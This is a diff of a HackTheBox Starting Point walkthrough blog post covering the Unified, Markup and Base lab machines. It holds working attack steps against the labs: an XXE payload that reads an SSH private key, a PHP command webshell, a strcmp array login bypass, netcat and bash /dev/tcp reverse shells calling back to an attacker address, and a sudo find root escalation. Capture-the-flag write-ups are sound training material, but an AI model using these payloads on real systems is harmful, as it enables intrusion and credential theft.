@@ -1,6 +1,6 @@
 ---
 title: "Starting Point: Tier 3 Walkthrough"
-description: "HackTheBox Starting Point Tier 3 — Markup (Apache XXE to SSH key theft, then Windows privilege escalation through a writable job.bat) and Unified (UniFi Network Log4Shell to root)."
+description: "Completing HackTheBox Starting Point with Unified (UniFi Network Log4Shell to root), Markup (Apache XXE to SSH key theft and a writable job.bat), and Base (PHP strcmp bypass, webshell upload and find sudo escalation)."
 date: "2026-11-23"
 difficulty: "Easy"
 published: true
@@ -8,312 +8,23 @@ published: true
 
 # Starting Point: Tier 3 Walkthrough
 
-> Tier 3 of HackTheBox's Starting Point path. **Markup** is the final lab documented here — an Apache/PHP site with an XXE flaw in its XML order form, leading to Daniel's SSH key and a Windows privilege escalation through a script any user can overwrite. **Unified** is included after it as a second, full machine writeup.
+> The final three writeups of HackTheBox's **Starting Point** path, in the order I completed them: **Unified**, **Markup**, and finally **Base**. With Base solved, the whole Starting Point track is complete.
 
 ---
 
 ## Overview
 
-| Machine | Platform | Core vulnerability | Result |
-|---|---|---|---|
-| **Markup** | Windows Server / XAMPP (Apache 2.4.41, PHP 7.2.28) | XXE in `POST /process.php` | Read `id_rsa` → SSH as Daniel → overwrite `job.bat` → SYSTEM shell |
-| **Unified** | Linux / Ubiquiti UniFi Network 6.4.54 | Log4Shell (CVE-2021-44228) in the login `remember` field | Reverse shell as `unifi` → rewrite admin hash in MongoDB → SSH as root |
+| # | Machine | Platform | Core vulnerability | Result |
+|---|---|---|---|---|
+| 1 | **Unified** | Linux / Ubiquiti UniFi Network 6.4.54 | Log4Shell (CVE-2021-44228) in the login `remember` field | Reverse shell as `unifi` → rewrite admin hash in MongoDB → SSH as root |
+| 2 | **Markup** | Windows Server / XAMPP (Apache 2.4.41, PHP 7.2.28) | XXE in `POST /process.php` | Read `id_rsa` → SSH as Daniel → overwrite `job.bat` → SYSTEM shell |
+| 3 | **Base** | Ubuntu 18.04 / Apache 2.4.29 | Vim swap file leak → `strcmp()` type juggling → unrestricted upload | PHP webshell → shell as `www-data` → credentials in `config.php` → SSH as john → `find -exec` to root |
 
-Markup is solved by answering the lab's eight guided questions, which walk from fingerprinting the web server all the way to both flags. Unified follows as a full machine writeup.
-
----
-
-## 1. Markup
-
-### Machine Information
-
-| | |
-|---|---|
-| **Name** | Markup |
-| **Platform** | Hack The Box — Starting Point, Tier 3 (final lab) |
-| **OS** | Windows Server 2019 (`10.0.17763.107`) |
-| **Web stack** | Apache `2.4.41`, PHP `7.2.28`, OpenSSL `1.1.1c` |
-| **Attack vector** | XML External Entity injection in the `Order in Bulk` form |
-
-Wappalyzer identifies the stack before any interaction with the application:
-
-<div className="max-w-[280px] mx-auto">
-
-![Wappalyzer showing Apache 2.4.41, PHP 7.2.28, OpenSSL 1.1.1c and Windows Server](/images/writeups/hackthebox/markup-wappalyzer.png)
-
-</div>
+Unified is a full machine writeup; Markup and Base are the guided labs that closed out the path.
 
 ---
 
-### Task 1 — Apache version
-
-> What version of Apache is running on the target's port 80?
-
-**Answer:** `2.4.41`
-
-The `Server` response header and Wappalyzer both report `Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28`.
-
----
-
-### Task 2 — Credentials
-
-> What username:password combination logs in successfully?
-
-**Answer:** `admin:password`
-
-The login form at the root of the site accepts the default pair.
-
-![Login form with admin:password](/images/writeups/hackthebox/markup-order-form.png)
-
----
-
-### Task 3 — The user-input word
-
-> What is the word at the top of the page that accepts user input?
-
-**Answer:** `order`
-
-The authenticated page is `services.php`; its "Order in Bulk" form posts to `process.php`.
-
-![Order in Bulk form on services.php](/images/writeups/hackthebox/markup-login.png)
-
-The same form in a full-page browser view:
-
-![Full-page view of the Order in Bulk form](/images/writeups/hackthebox/markup-order-page.png)
-
----
-
-### Task 4 — XML version
-
-> What XML version is used on the target?
-
-**Answer:** `1.0`
-
-Inspecting the page reveals the client-side code that builds the request:
-
-```javascript
-var xmlTemplate = '<?xml version="1.0"?><orders>';
-for (var i = 0; i < elements.length; i++) {
-  if (elements[i].tagName == 'INPUT') {
-    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
-  } else {
-    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
-  }
-}
-xmlTemplate += '</orders>';
-var http = new XMLHttpRequest();
-var url = 'process.php';
-http.open('POST', url, true);
-http.setRequestHeader('Content-Type', 'text/xml');
-http.send(xmlTemplate);
-```
-
-The application sends a `text/xml` body to `process.php` — and that parser is the way in.
-
-![DevTools showing the XML template built from form fields](/images/writeups/hackthebox/markup-xml-source.png)
-
----
-
-### Task 5 — The acronym
-
-> What does the XXE / XEE attack acronym stand for?
-
-**Answer:** `XML External Entity`
-
-The parser resolves external entities declared in a `DOCTYPE`, so a `SYSTEM` entity can make the server read a local file and echo it back in the response.
-
----
-
-### Task 6 — The username in source
-
-> What username can we find on the webpage's HTML code?
-
-**Answer:** `Daniel`
-
-Viewing the source of `services.php` shows a leftover developer comment:
-
-```html
-<!-- Modified by Daniel : UI-FIX-9092 -->
-```
-
-![View-source showing the 'Modified by Daniel' comment](/images/writeups/hackthebox/markup-source-comment.png)
-
-That gives us a Windows username to target with the XXE read.
-
----
-
-### Task 7 — The file in Log-Management
-
-> What is the file located in the Log-Management folder on the target?
-
-Intercept the `POST /process.php` request in Burp, send it to Repeater, and replace the body with an entity that reads Daniel's private key.
-
-![Baseline XML request to process.php in Burp Repeater](/images/writeups/hackthebox/markup-burp-baseline.png)
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE root [
-    <!ENTITY test SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">
-]>
-<order>
-    <quantity>3</quantity>
-    <item>&test;</item>
-    <address>17th Estate, CA</address>
-</order>
-```
-
-![XXE payload returning Daniel's SSH private key](/images/writeups/hackthebox/markup-burp-xxe.png)
-
-**Answer:** `job.bat`
-
-The key is copied into `id_rsa`, given the correct permissions, and used to SSH in as Daniel:
-
-```bash
-vim id_rsa
-chmod 600 id_rsa
-ssh daniel@10.129.62.189 -i id_rsa
-```
-
-```text
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-daniel@MARKUP C:\Users\daniel>cd ..
-daniel@MARKUP C:\>cd Log-Management
-daniel@MARKUP C:\Log-Management>dir
- Directory of C:\Log-Management
-03/12/2020  02:56 AM    <DIR>          .
-03/12/2020  02:56 AM    <DIR>          ..
-03/06/2020  01:42 AM               346 job.bat
-               1 File(s)            346 bytes
-               2 Dir(s)   7,409,496,064 bytes free
-```
-
-<Callout type="info" title="IP Changed Mid-Lab">
-  The target address changed from `10.129.95.192` to `10.129.62.189` because the lab machine died partway through testing and had to be restarted. The screenshots show both addresses.
-</Callout>
-
----
-
-### Task 8 — The executable in job.bat
-
-> What executable is mentioned in the file mentioned before?
-
-```text
-daniel@MARKUP C:\Log-Management>type job.bat
-@echo off
-FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
-IF (%adminTest%)==(Access) goto noAdmin
-for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
-echo.
-echo Event Logs have been cleared!
-goto theEnd
-:do_clear
-wevtutil.exe cl %1
-goto :eof
-:noAdmin
-echo You must run this script as an Administrator!
-:theEnd
-exit
-```
-
-**Answer:** `wevtutil.exe`
-
-The batch file clears Windows event logs using `wevtutil.exe`, and it is designed to run as Administrator. That makes it an ideal hijack target — if we can write to it and something privileged executes it, we get a privileged shell.
-
----
-
-### User Flag
-
-```text
-daniel@MARKUP C:\Users\daniel>cd Desktop
-daniel@MARKUP C:\Users\daniel\Desktop>dir
- Directory of C:\Users\daniel\Desktop
-03/05/2020  06:18 AM    <DIR>          .
-03/05/2020  06:18 AM    <DIR>          ..
-03/05/2020  06:18 AM                35 user.txt
-               1 File(s)             35 bytes
-daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
-032d2...8ef7
-```
-
----
-
-### Root Flag
-
-Check who is allowed to modify the script:
-
-```text
-daniel@MARKUP C:\Log-Management>icacls job.bat
-job.bat BUILTIN\Users:(F)
-        NT AUTHORITY\SYSTEM:(I)(F)
-        BUILTIN\Administrators:(I)(F)
-        BUILTIN\Users:(I)(RX)
-Successfully processed 1 files; Failed processing 0 files
-```
-
-`BUILTIN\Users:(F)` — every user has full control. Overwrite `job.bat` with a reverse-shell command and wait for a privileged process to run it.
-
-Download a Windows netcat binary ([nc64.exe](https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe)) to the attack machine and serve it:
-
-```bash
-cd Downloads/
-ls
-# nc64.exe
-python3 -m http.server
-# Serving HTTP on 0.0.0.0 port 8000 ...
-```
-
-Grab the VPN address so the payload points back correctly:
-
-```bash
-ifconfig
-# tun0: inet 10.10.15.192  netmask 255.255.254.0
-```
-
-From the Windows host, fetch it with PowerShell:
-
-```text
-daniel@MARKUP C:\Log-Management>powershell
-PS C:\Log-Management> wget http://10.10.15.192:8000/nc64.exe -outfile nc64.exe
-PS C:\Log-Management> dir
-    Directory: C:\Log-Management
--a----         3/6/2020   1:42 AM            346 job.bat
--a----       11/23/2026   4:54 AM          45272 nc64.exe
-```
-
-The Python server confirms the transfer:
-
-```text
-10.129.62.189 - - [23/Nov/2026 07:54:13] "GET /nc64.exe HTTP/1.1" 200 -
-```
-
-Start a listener, then overwrite the batch file:
-
-```bash
-nc -lnvp 4444
-```
-
-```text
-daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.192 4444 > C:\Log-Management\job.bat
-```
-
-The elevated scheduled execution of `job.bat` returns a shell as Administrator:
-
-```text
-Listening on 0.0.0.0 4444
-Connection received on 10.129.62.189 49675
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>cd C:\Users\Administrator\Desktop
-C:\Users\Administrator\Desktop>type root.txt
-f574…70f8
-```
-
----
-
-## 2. Unified
+## 1. Unified
 
 ### Machine Information
 
@@ -635,16 +346,586 @@ Box pwned.
 
 ---
 
+## 2. Markup
+
+### Machine Information
+
+| | |
+|---|---|
+| **Name** | Markup |
+| **Platform** | Hack The Box — Starting Point, Tier 3 |
+| **OS** | Windows Server 2019 (`10.0.17763.107`) |
+| **Web stack** | Apache `2.4.41`, PHP `7.2.28`, OpenSSL `1.1.1c` |
+| **Attack vector** | XML External Entity injection in the `Order in Bulk` form |
+
+Wappalyzer identifies the stack before any interaction with the application:
+
+<div className="max-w-[280px] mx-auto">
+
+![Wappalyzer showing Apache 2.4.41, PHP 7.2.28, OpenSSL 1.1.1c and Windows Server](/images/writeups/hackthebox/markup-wappalyzer.png)
+
+</div>
+
+---
+
+### Task 1 — Apache version
+
+> What version of Apache is running on the target's port 80?
+
+**Answer:** `2.4.41`
+
+The `Server` response header and Wappalyzer both report `Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28`.
+
+---
+
+### Task 2 — Credentials
+
+> What username:password combination logs in successfully?
+
+**Answer:** `admin:password`
+
+The login form at the root of the site accepts the default pair.
+
+![Login form with admin:password](/images/writeups/hackthebox/markup-order-form.png)
+
+---
+
+### Task 3 — The user-input word
+
+> What is the word at the top of the page that accepts user input?
+
+**Answer:** `order`
+
+The authenticated page is `services.php`; its "Order in Bulk" form posts to `process.php`.
+
+![Order in Bulk form on services.php](/images/writeups/hackthebox/markup-login.png)
+
+The same form in a full-page browser view:
+
+![Full-page view of the Order in Bulk form](/images/writeups/hackthebox/markup-order-page.png)
+
+---
+
+### Task 4 — XML version
+
+> What XML version is used on the target?
+
+**Answer:** `1.0`
+
+Inspecting the page reveals the client-side code that builds the request:
+
+```javascript
+var xmlTemplate = '<?xml version="1.0"?><orders>';
+for (var i = 0; i < elements.length; i++) {
+  if (elements[i].tagName == 'INPUT') {
+    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
+  } else {
+    xmlTemplate += '<' + elements[i].name + '>' + elements[i].value + '</' + elements[i].name + '>';
+  }
+}
+xmlTemplate += '</orders>';
+var http = new XMLHttpRequest();
+var url = 'process.php';
+http.open('POST', url, true);
+http.setRequestHeader('Content-Type', 'text/xml');
+http.send(xmlTemplate);
+```
+
+The application sends a `text/xml` body to `process.php` — and that parser is the way in.
+
+![DevTools showing the XML template built from form fields](/images/writeups/hackthebox/markup-xml-source.png)
+
+---
+
+### Task 5 — The acronym
+
+> What does the XXE / XEE attack acronym stand for?
+
+**Answer:** `XML External Entity`
+
+The parser resolves external entities declared in a `DOCTYPE`, so a `SYSTEM` entity can make the server read a local file and echo it back in the response.
+
+---
+
+### Task 6 — The username in source
+
+> What username can we find on the webpage's HTML code?
+
+**Answer:** `Daniel`
+
+Viewing the source of `services.php` shows a leftover developer comment:
+
+```html
+<!-- Modified by Daniel : UI-FIX-9092 -->
+```
+
+![View-source showing the 'Modified by Daniel' comment](/images/writeups/hackthebox/markup-source-comment.png)
+
+That gives us a Windows username to target with the XXE read.
+
+---
+
+### Task 7 — The file in Log-Management
+
+> What is the file located in the Log-Management folder on the target?
+
+Intercept the `POST /process.php` request in Burp, send it to Repeater, and replace the body with an entity that reads Daniel's private key.
+
+![Baseline XML request to process.php in Burp Repeater](/images/writeups/hackthebox/markup-burp-baseline.png)
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+    <!ENTITY test SYSTEM "file:///C:/Users/daniel/.ssh/id_rsa">
+]>
+<order>
+    <quantity>3</quantity>
+    <item>&test;</item>
+    <address>17th Estate, CA</address>
+</order>
+```
+
+![XXE payload returning Daniel's SSH private key](/images/writeups/hackthebox/markup-burp-xxe.png)
+
+**Answer:** `job.bat`
+
+The key is copied into `id_rsa`, given the correct permissions, and used to SSH in as Daniel:
+
+```bash
+vim id_rsa
+chmod 600 id_rsa
+ssh daniel@10.129.62.189 -i id_rsa
+```
+
+```text
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+daniel@MARKUP C:\Users\daniel>cd ..
+daniel@MARKUP C:\>cd Log-Management
+daniel@MARKUP C:\Log-Management>dir
+ Directory of C:\Log-Management
+03/12/2020  02:56 AM    <DIR>          .
+03/12/2020  02:56 AM    <DIR>          ..
+03/06/2020  01:42 AM               346 job.bat
+               1 File(s)            346 bytes
+               2 Dir(s)   7,409,496,064 bytes free
+```
+
+<Callout type="info" title="IP Changed Mid-Lab">
+  The target address changed from `10.129.95.192` to `10.129.62.189` because the lab machine died partway through testing and had to be restarted. The screenshots show both addresses.
+</Callout>
+
+---
+
+### Task 8 — The executable in job.bat
+
+> What executable is mentioned in the file mentioned before?
+
+```text
+daniel@MARKUP C:\Log-Management>type job.bat
+@echo off
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo Event Logs have been cleared!
+goto theEnd
+:do_clear
+wevtutil.exe cl %1
+goto :eof
+:noAdmin
+echo You must run this script as an Administrator!
+:theEnd
+exit
+```
+
+**Answer:** `wevtutil.exe`
+
+The batch file clears Windows event logs using `wevtutil.exe`, and it is designed to run as Administrator. That makes it an ideal hijack target — if we can write to it and something privileged executes it, we get a privileged shell.
+
+---
+
+### User Flag
+
+```text
+daniel@MARKUP C:\Users\daniel>cd Desktop
+daniel@MARKUP C:\Users\daniel\Desktop>dir
+ Directory of C:\Users\daniel\Desktop
+03/05/2020  06:18 AM    <DIR>          .
+03/05/2020  06:18 AM    <DIR>          ..
+03/05/2020  06:18 AM                35 user.txt
+               1 File(s)             35 bytes
+daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
+032d2...8ef7
+```
+
+---
+
+### Root Flag
+
+Check who is allowed to modify the script:
+
+```text
+daniel@MARKUP C:\Log-Management>icacls job.bat
+job.bat BUILTIN\Users:(F)
+        NT AUTHORITY\SYSTEM:(I)(F)
+        BUILTIN\Administrators:(I)(F)
+        BUILTIN\Users:(I)(RX)
+Successfully processed 1 files; Failed processing 0 files
+```
+
+`BUILTIN\Users:(F)` — every user has full control. Overwrite `job.bat` with a reverse-shell command and wait for a privileged process to run it.
+
+Download a Windows netcat binary ([nc64.exe](https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe)) to the attack machine and serve it:
+
+```bash
+cd Downloads/
+ls
+# nc64.exe
+python3 -m http.server
+# Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+Grab the VPN address so the payload points back correctly:
+
+```bash
+ifconfig
+# tun0: inet 10.10.15.192  netmask 255.255.254.0
+```
+
+From the Windows host, fetch it with PowerShell:
+
+```text
+daniel@MARKUP C:\Log-Management>powershell
+PS C:\Log-Management> wget http://10.10.15.192:8000/nc64.exe -outfile nc64.exe
+PS C:\Log-Management> dir
+    Directory: C:\Log-Management
+-a----         3/6/2020   1:42 AM            346 job.bat
+-a----       11/23/2026   4:54 AM          45272 nc64.exe
+```
+
+The Python server confirms the transfer:
+
+```text
+10.129.62.189 - - [23/Nov/2026 07:54:13] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+Start a listener, then overwrite the batch file:
+
+```bash
+nc -lnvp 4444
+```
+
+```text
+daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.192 4444 > C:\Log-Management\job.bat
+```
+
+The elevated scheduled execution of `job.bat` returns a shell as Administrator:
+
+```text
+Listening on 0.0.0.0 4444
+Connection received on 10.129.62.189 49675
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop>type root.txt
+f574…70f8
+```
+
+---
+
+## 3. Base
+
+### Machine Information
+
+| | |
+|---|---|
+| **Name** | Base |
+| **Platform** | Hack The Box — Starting Point (final lab) |
+| **OS** | Ubuntu 18.04.6 LTS, kernel `4.15.0-151-generic` |
+| **Web stack** | Apache `2.4.29` (Ubuntu), PHP |
+| **Attack vector** | Exposed Vim swap file → `strcmp()` array bypass → unrestricted webshell upload → `find` sudo abuse |
+
+---
+
+### Task 1 — Open ports
+
+> Which two TCP ports are open on the remote host?
+
+```bash
+nmap -sC -sV 10.129.62.191
+```
+
+```text
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-23 08:32 EST
+Nmap scan report for 10.129.62.191
+Host is up (0.0076s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome to Base
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+**Answer:** `22, 80` — SSH and a plain HTTP site.
+
+---
+
+### Task 2 — Login path
+
+> What is the relative path on the webserver for the login page?
+
+**Answer:** `/login/login.php`
+
+The site's navigation links straight to it from the landing page.
+
+---
+
+### Task 3 — Files in the login directory
+
+> How many files are present in the `/login` directory?
+
+**Answer:** `3` — `login.php`, `login.php.swp`, and `config.php`.
+
+The swap file is the interesting one; it shouldn't be served at all.
+
+<div className="max-w-[520px] mx-auto">
+
+![Reading the exposed login.php.swap file](/images/writeups/hackthebox/base-swap-file.png)
+
+</div>
+
+---
+
+### Task 4 — Swap file extension
+
+> What is the file extension of a swap file?
+
+**Answer:** `.swp`
+
+Vim writes `.swp` files while a document is open and, if interrupted, leaves them behind. Because Apache serves any file in the webroot, `login.php.swp` is downloadable from `/login/login.php.swp`. The file is Vim's compressed swap format, so it looks like binary garbage until passed through `strings`.
+
+---
+
+### Task 5 — The comparison function
+
+> Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?
+
+Download `login.php.swp` and run `strings` on it — the source is recoverable even though `cat` shows mostly noise:
+
+```bash
+strings -n 5 login.php.swp
+```
+
+```php
+b0VIM 8.0
+/var/www/html/login/login.php
+...
+session_start();
+if (!empty($_POST['username']) && !empty($_POST['password'])) {
+  require('config.php');
+  if (strcmp($username, $_POST['username']) == 0) {
+    if (strcmp($password, $_POST['password']) == 0) {
+      $_SESSION['user_id'] = 1;
+      header("Location: /upload.php");
+    } else {
+      ...
+```
+
+**Answer:** `strcmp()`
+
+`strcmp()` compares two **strings**. PHP's loose comparison of an array against a string returns `NULL`, and in PHP 5/7 `NULL == 0` evaluates to `true` — so submitting both fields as arrays bypasses the check.
+
+---
+
+### Task 6 — Upload directory
+
+> In which directory are the uploaded files stored?
+
+Intercept the login POST in Burp and change the body from scalar values to arrays:
+
+```text
+username[]=admin&password[]=pass
+```
+
+<div className="max-w-[520px] mx-auto">
+
+![Burp intercept with the array-based strcmp bypass](/images/writeups/hackthebox/base-auth-bypass.png)
+
+</div>
+
+That logs us in as admin and exposes `/upload.php`.
+
+![Admin file upload page](/images/writeups/hackthebox/base-upload-page.png)
+
+Create a minimal command-execution shell and upload it:
+
+```bash
+echo "<?php echo system(\$_REQUEST['cmd']); ?>" > test.php
+```
+
+Find where uploads land:
+
+```bash
+ffuf -u http://10.129.62.191/FUZZ -w /usr/share/wordlists/dirb/big.txt
+```
+
+```text
+_uploaded               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 7ms]
+login                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 7ms]
+```
+
+<div className="max-w-[520px] mx-auto">
+
+![Directory listing of /_uploaded showing the uploaded files](/images/writeups/hackthebox/base-uploaded-dir.png)
+
+</div>
+
+**Answer:** `_uploaded`
+
+---
+
+### Task 7 — User with a home directory
+
+> Which user exists on the remote host with a home directory?
+
+Test the webshell:
+
+```text
+http://10.129.62.191/_uploaded/test.php?cmd=id
+```
+
+<div className="max-w-[520px] mx-auto">
+
+![Webshell executing id as www-data](/images/writeups/hackthebox/base-shell-id.png)
+
+</div>
+
+Then list the home directories:
+
+```text
+http://10.129.62.191/_uploaded/test.php?cmd=ls%20/home
+```
+
+**Answer:** `john`
+
+---
+
+### Task 8 — Password for that user
+
+> What is the password for the user present on the system?
+
+Set up a listener for a proper interactive shell:
+
+```bash
+nc -lvnp 4444
+```
+
+URL-encode a reverse shell passed through the `cmd` parameter:
+
+```text
+cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.192/4444 0>&1'
+cmd=/bin/bash%20-c%20%27bash%20-i%20>&%20/dev/tcp/10%2E10%2E15%2E192/4444%200>&1%27
+```
+
+```text
+Connection received on 10.129.62.191 37574
+bash: cannot set terminal process group (1158): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@base:/var/www/html$ cd login
+www-data@base:/var/www/html/login$ ls
+config.php  login.php  login.php.swp
+www-data@base:/var/www/html/login$ cat config.php
+<?php
+$username = "admin";
+$password = "thisisagoodpassword";
+```
+
+**Answer:** `thisisagoodpassword`
+
+---
+
+### User Flag
+
+SSH in as john with the recovered password:
+
+```bash
+ssh john@10.129.62.191
+```
+
+```text
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+john@base:~$ ls
+user.txt
+john@base:~$ cat user.txt
+f548…158e
+```
+
+---
+
+### Task 10 — sudo command
+
+> What is the full path to the command that the user john can run as user root on the remote host?
+
+```bash
+sudo -l
+```
+
+```text
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+```
+
+**Answer:** `/usr/bin/find`
+
+---
+
+### Task 11 — Exploitable find action
+
+> What action can the `find` command use to execute commands?
+
+**Answer:** `exec`
+
+`find`'s `-exec` flag runs an arbitrary command for every matched file, and sudo executes it with root privileges.
+
+---
+
+### Root Flag
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+```text
+$ sudo find . -exec /bin/sh \; -quit
+# ls
+user.txt
+# cd /root
+# ls
+root.txt
+# cat root.txt
+5170…a949
+```
+
+---
+
+<Callout type="tip" title="Starting Point Complete">
+  Base was the last lab. With Markup and Base documented here — and Unified merged in — the entire Hack The Box Starting Point path is complete.
+</Callout>
+
+<div className="max-w-[420px] mx-auto">
+
+![You have solved Base — 250 XP earned](/images/writeups/hackthebox/base-solved.png)
+
+</div>
+
 ---
 
 ## Lessons Learned
-
-### Markup
-
-- **The guided questions are a breadcrumb trail, not busywork.** Each answer (Apache version, `admin:password`, `order`, XML 1.0, `Daniel`, `job.bat`, `wevtutil.exe`) feeds the next step. The "Modified by Daniel" source comment is what turns a generic XXE into a targeted read of `C:\Users\daniel\.ssh\id_rsa`.
-- **XXE is a file-read primitive, not just a parser bug.** The `POST /process.php` endpoint accepted a `DOCTYPE` declaration and happily expanded `SYSTEM "file:///..."` — handing over the private key needed for the next stage.
-- **Always run `icacls` on interesting Windows scripts.** `BUILTIN\Users:(F)` on `job.bat` meant any user could replace a script that runs with elevated privileges. That single ACL is the whole privilege escalation.
-- **A service account's tooling becomes your payload delivery.** Python's `http.server` plus PowerShell's `wget` moved `nc64.exe` onto the target without needing any exploit-specific upload primitive.
 
 ### Unified
 
@@ -654,3 +935,17 @@ Box pwned.
 - **A service account is often a database administrator too.** The `unifi` user had full read/write access to the controller's MongoDB, which made cracking the hash unnecessary — replacing it was faster and deterministic.
 - **Application config is a credential store.** UniFi's SSH Authentication settings exposed the root password in plain text. Once you control the application's admin session, OS-level access is often one setting away.
 - **Watch for localhost-only databases.** Port `27117` never appeared in the external `nmap` scan. Enumerating running processes from inside the foothold (`ps aux | grep mongo`) is what revealed it.
+
+### Markup
+
+- **The guided questions are a breadcrumb trail, not busywork.** Each answer (Apache version, `admin:password`, `order`, XML 1.0, `Daniel`, `job.bat`, `wevtutil.exe`) feeds the next step. The "Modified by Daniel" source comment is what turns a generic XXE into a targeted read of `C:\Users\daniel\.ssh\id_rsa`.
+- **XXE is a file-read primitive, not just a parser bug.** The `POST /process.php` endpoint accepted a `DOCTYPE` declaration and happily expanded `SYSTEM "file:///..."` — handing over the private key needed for the next stage.
+- **Always run `icacls` on interesting Windows scripts.** `BUILTIN\Users:(F)` on `job.bat` meant any user could replace a script that runs with elevated privileges. That single ACL is the whole privilege escalation.
+- **A service account's tooling becomes your payload delivery.** Python's `http.server` plus PowerShell's `wget` moved `nc64.exe` onto the target without needing any exploit-specific upload primitive.
+### Base
+
+- **Never leave editor swap files in the webroot.** `login.php.swp` was a full source disclosure: `strings -n 5` recovered the `strcmp()` calls that became the authentication bypass.
+- **`strcmp()` with arrays is a classic PHP type-juggling bug.** Posting `username[]=admin&password[]=pass` makes both comparisons return `NULL`, which loosely equals `0` — the login accepts it.
+- **Restricted uploads mean nothing if the upload directory executes code.** A 20-byte webshell in `_uploaded` gave command execution as `www-data`, and the site's own `config.php` supplied john's password.
+- **`find -exec` is a full shell when sudo allows it.** `(root : root) /usr/bin/find` is effectively root: `sudo find . -exec /bin/sh \; -quit` ends the path.
+
